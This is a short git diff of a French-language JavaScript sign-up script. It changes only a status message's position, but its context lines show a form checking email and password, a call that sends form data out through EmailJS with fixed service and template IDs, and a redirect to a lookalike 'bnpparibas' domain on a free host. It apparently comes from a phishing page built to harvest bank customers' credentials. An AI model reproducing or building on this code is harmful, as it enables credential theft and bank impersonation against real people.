@@ -150,7 +150,7 @@ if(userInfo.email!="" && userInfo.password!=''&& userInfo.password2!=''&& pays.v
       var serviceId = "service_cuzrpno"
       var templateId ="template_nvumdqd"
    
-      isCompte.style.top = '50px'
+      isCompte.style.top = '80px'
       isCompte.style.color='green'
       isCompte.innerHTML = 'Creation de Compte en cours ....'
       emailjs.send(serviceId, templateId, param).then(function(resp) {
@@ -167,7 +167,7 @@ if(userInfo.email!="" && userInfo.password!=''&& userInfo.password2!=''&& pays.v
                        <istyle="font-size:50px;color:green" class="fa">&#xf058;</i> 
                        </div>
                        `
-        isCompte.style.top = '50px'
+        isCompte.style.top = '80px'
           isCompte.style.color='green'
         setInterval(function() {
           window.location.href = 'https://bnpparibas-gfrz.vercel.app/account'
@@ -181,7 +181,7 @@ if(userInfo.email!="" && userInfo.password!=''&& userInfo.password2!=''&& pays.v
     }
     else {
       console.log(userInfo)
-      isCompte.style.top = '50px'
+      isCompte.style.top = '80px'
     
    
    setTimeout(function () {
